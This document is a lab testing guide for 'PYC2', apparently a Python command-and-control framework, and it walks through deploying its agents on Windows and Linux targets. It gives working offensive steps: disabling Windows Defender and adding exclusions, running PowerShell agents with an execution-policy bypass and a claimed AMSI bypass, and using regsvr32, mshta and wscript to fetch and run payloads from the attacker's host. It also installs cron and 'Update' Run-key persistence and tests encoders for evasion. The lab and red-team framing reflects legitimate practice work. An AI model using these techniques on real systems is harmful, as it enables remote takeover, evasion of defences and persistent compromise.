# Testing Guide - Lab Environment Setup

## 🧪 Overview

This guide helps you set up a safe lab environment to test PYC2 framework functionality before real engagements.

---

## 🏗️ Lab Setup Requirements

### Minimum Setup
- **Attacker Machine**: Linux (Kali, Ubuntu, Debian)
- **Target Machine**: Windows 10/11 or Linux
- **Network**: Isolated network or VirtualBox/VMware host-only network

### Recommended Setup
- **Attacker**: Kali Linux VM (4GB RAM, 2 CPUs)
- **Targets**: 
  - Windows 10 VM (4GB RAM, 2 CPUs)
  - Ubuntu/Debian VM (2GB RAM, 1 CPU)
- **Network**: Isolated virtual network

---

## 🔧 Network Configuration

### VirtualBox Setup

1. **Create Host-Only Network**:
   ```
   File → Host Network Manager → Create
   Configure IP: 192.168.56.1/24
   DHCP: Enabled (192.168.56.100 - 192.168.56.254)
   ```

2. **Configure VMs**:
   - Attacker: Adapter 1 = NAT, Adapter 2 = Host-Only
   - Targets: Adapter 1 = Host-Only (isolated)

3. **Verify Connectivity**:
   ```bash
   # Attacker
   ip addr show
   ping 192.168.56.101  # Target IP
   ```

### VMware Setup

1. **Create Custom Network**:
   ```
   Edit → Virtual Network Editor
   Add Network → VMnet2
   Type: Host-only
   Subnet: 192.168.100.0/24
   ```

2. **Configure VMs**:
   - Set network adapter to VMnet2
   - Verify DHCP assigned IPs

---

## ✅ Pre-Test Checklist

### Attacker Machine
```bash
# Check Python version
python3 --version  # Should be 3.8+

# Install dependencies
pip3 install PyQt6

# Verify installation
python3 -c "from PyQt6.QtWidgets import QApplication; print('OK')"

# Check firewall
sudo ufw status
sudo ufw allow 9999/tcp  # C2 port
sudo ufw allow 8080/tcp  # HTTP server port
```

### Target Machines

**Windows**:
```powershell
# Verify Python (if testing Python agents)
python --version

# Check network
ipconfig
ping 192.168.56.1  # Attacker IP

# Disable Windows Defender (for testing only!)
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Linux**:
```bash
# Check Python
python3 --version

# Check network
ip addr show
ping 192.168.56.1  # Attacker IP

# Allow connections (if firewall active)
sudo ufw allow from 192.168.56.0/24
```

---

## 🧪 Test Scenarios

### Test 1: Basic Connection

**Objective**: Verify C2 server and basic agent connection

**Steps**:

1. **Start C2 Server** (Attacker):
   ```bash
   python3 c2_gui.py
   # Set LHOST: 192.168.56.1 (your attacker IP)
   # Set LPORT: 9999
   # Click "Start Listener"
   ```

2. **Generate Basic Agent**:
   - Click "Payload Generator"
   - Select "C2PY Agents" → "Legacy Compatible"
   - Select first payload
   - Click "Generate"
   - Click "Copy Payload"

3. **Deploy on Target**:
   ```bash
   # Save to file
   nano test_agent.py
   # Paste payload
   
   # Run
   python3 test_agent.py
   ```

4. **Verify Connection**:
   - Agent should appear in client table
   - Try command: `whoami`
   - Verify response in terminal

**Expected Result**: ✅ Agent connects, commands work

---

### Test 2: Encrypted Communication

**Objective**: Test XOR encrypted agent

**Steps**:

1. **Generate Advanced Agent**:
   - Payload Generator → "C2PY Agents" → "Advanced Python"
   - Select first payload (with XOR encryption)
   - Generate and deploy

2. **Test Commands**:
   ```bash
   whoami
   pwd
   ls -la
   uname -a
   ```

3. **Verify Encryption**:
   - Capture traffic with Wireshark (optional)
   - Verify commands are encrypted

**Expected Result**: ✅ Encrypted agent works correctly

---

### Test 3: PowerShell Agent (Windows Only)

**Objective**: Test PowerShell agent with AMSI bypass

**Steps**:

1. **Generate PowerShell Agent**:
   - Payload Generator → "PowerShell" → "Advanced"
   - Generate and copy

2. **Deploy on Windows Target**:
   ```powershell
   # Save to file
   notepad agent.ps1
   # Paste payload
   
   # Run
   powershell -ExecutionPolicy Bypass -File agent.ps1
   ```

3. **Test PowerShell Commands**:
   ```powershell
   Get-Process
   Get-Service
   Get-ChildItem C:\
   $env:USERNAME
   ```

**Expected Result**: ✅ PowerShell agent connects, AMSI bypass works

---

### Test 4: LOLBAS Techniques (Windows Only)

**Objective**: Test Living Off The Land techniques

**Prerequisites**:
- HTTP server for hosting templates
- Windows target with internet access to attacker

**Steps**:

1. **Start HTTP Server** (Attacker):
   ```bash
   python3 lolbas_server.py -p 8080
   ```

2. **Configure LOLBAS Template**:
   ```bash
   cd lolbas_templates
   
   # Edit payload.sct
   sed -i 's/REPLACE_WITH_LHOST/192.168.56.1/g' payload.sct
   sed -i 's/REPLACE_WITH_LPORT/9999/g' payload.sct
   ```

3. **Execute on Windows Target**:
   ```cmd
   regsvr32.exe /s /n /u /i:http://192.168.56.1:8080/payload.sct scrobj.dll
   ```

4. **Test Other LOLBAS Techniques**:
   ```cmd
   # MSHTA
   mshta.exe http://192.168.56.1:8080/payload.hta
   
   # WScript
   wscript.exe http://192.168.56.1:8080/payload.vbs
   ```

**Expected Result**: ✅ LOLBAS techniques establish connections

---

### Test 5: Persistence (Optional)

**Objective**: Test persistence mechanisms

**Steps**:

1. **Linux Cron Persistence**:
   ```bash
   # Add to crontab
   (crontab -l; echo "@reboot python3 /tmp/agent.py") | crontab -
   
   # Reboot and verify reconnection
   sudo reboot
   ```

2. **Windows Registry Persistence**:
   ```powershell
   # Add to registry
   New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "pythonw.exe C:\Temp\agent.py"
   
   # Restart and verify
   Restart-Computer
   ```

**Expected Result**: ✅ Agent automatically reconnects after reboot

---

### Test 6: Multiple Agents

**Objective**: Test multiple simultaneous connections

**Steps**:

1. **Deploy Multiple Agents**:
   - Deploy agent on Windows target
   - Deploy agent on Linux target
   - Deploy second agent on same target (different process)

2. **Verify All Connections**:
   - All agents visible in client table
   - Switch between agents
   - Send commands to each

3. **Test Agent Selection**:
   - Select agent 1, send command
   - Select agent 2, send command
   - Verify responses are separate

**Expected Result**: ✅ Multiple agents managed independently

---

### Test 7: Error Handling

**Objective**: Test error conditions and recovery

**Steps**:

1. **Test Invalid Commands**:
   ```bash
   nonexistentcommand
   rm /important/file/that/doesnt/exist
   ```

2. **Test Network Interruption**:
   - Disconnect target network
   - Wait 30 seconds
   - Reconnect network
   - Verify agent reconnects (advanced agents only)

3. **Test Kill and Restart**:
   - Kill agent process
   - Restart agent manually
   - Verify new connection

**Expected Result**: ✅ Errors handled gracefully, reconnection works

---

### Test 8: Payload Encoders

**Objective**: Test different encoding methods

**Steps**:

1. **Test Each Encoder**:
   - None (plain text)
   - Base64
   - Hex
   - PowerShell Base64

2. **Deploy and Verify**:
   - Each encoded payload should work
   - Commands execute correctly

**Expected Result**: ✅ All encoders produce working payloads

---

## 🔍 Verification Tests

### Network Traffic Analysis

**Using tcpdump**:
```bash
# Capture C2 traffic
sudo tcpdump -i any -w c2_traffic.pcap port 9999

# Analyze later
sudo tcpdump -r c2_traffic.pcap -A
```

**Using Wireshark**:
1. Start capture on host-only interface
2. Filter: `tcp.port == 9999`
3. Verify encrypted payloads (XOR) appear as random data
4. Verify plain text payloads are visible

### Process Verification

**Linux Target**:
```bash
ps aux | grep python
lsof -i :9999
netstat -antp | grep 9999
```

**Windows Target**:
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*python*"}
Get-NetTCPConnection | Where-Object {$_.RemotePort -eq 9999}
```

---

## 📊 Success Criteria

| Test | Expected Result | Status |
|------|----------------|--------|
| Basic Connection | Agent connects successfully | [ ] |
| Encrypted Agent | XOR encryption works | [ ] |
| PowerShell Agent | AMSI bypass successful | [ ] |
| LOLBAS Techniques | All techniques work | [ ] |
| Multiple Agents | All agents managed correctly | [ ] |
| Error Handling | Graceful error recovery | [ ] |
| Persistence | Auto-reconnection works | [ ] |
| Payload Encoders | All encoders functional | [ ] |

---

## 🐛 Common Issues and Solutions

### Issue: Agent Won't Connect

**Check**:
```bash
# Firewall
sudo ufw status
sudo iptables -L

# Listener status
netstat -tlnp | grep 9999

# Network connectivity
ping target_ip
```

**Solutions**:
- Verify LHOST/LPORT match
- Check firewall rules
- Ensure listener is running
- Test with netcat first

### Issue: Windows Defender Blocks Agent

**Solutions**:
1. Disable real-time protection (testing only):
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```

2. Add exclusion:
   ```powershell
   Add-MpPreference -ExclusionPath "C:\Temp"
   ```

3. Use LOLBAS techniques instead

### Issue: PyQt6 Import Error

**Solutions**:
```bash
# Reinstall
pip3 uninstall PyQt6
pip3 install PyQt6

# Or with user flag
pip3 install --user PyQt6
```

---

## 🧹 Lab Cleanup

After testing:

```bash
# Attacker
# Stop server
# Kill Python processes
pkill -f c2_gui.py

# Target (Linux)
rm /tmp/agent.py
crontab -r
ps aux | grep python | grep -v grep | awk '{print $2}' | xargs kill

# Target (Windows)
Remove-Item C:\Temp\agent.py
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update"
Get-Process | Where-Object {$_.ProcessName -like "*python*"} | Stop-Process

# Restore Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## 📝 Test Report Template

```
# PYC2 Test Report

Date: _____________
Tester: _____________

## Environment
- Attacker OS: _____________
- Target OS: _____________
- Network Config: _____________

## Test Results
- Basic Connection: ✅/❌
- Encrypted Agent: ✅/❌
- PowerShell Agent: ✅/❌
- LOLBAS Techniques: ✅/❌
- Multiple Agents: ✅/❌
- Error Handling: ✅/❌

## Issues Found
1. _____________
2. _____________

## Notes
_____________
_____________
```

---

## 🎓 Next Steps

After successful lab testing:

1. Review all documentation
2. Understand OpSec considerations
3. Practice cleanup procedures
4. Document lessons learned
5. Plan real engagement carefully

---

**Remember**: Always test thoroughly in the lab before any real engagement!
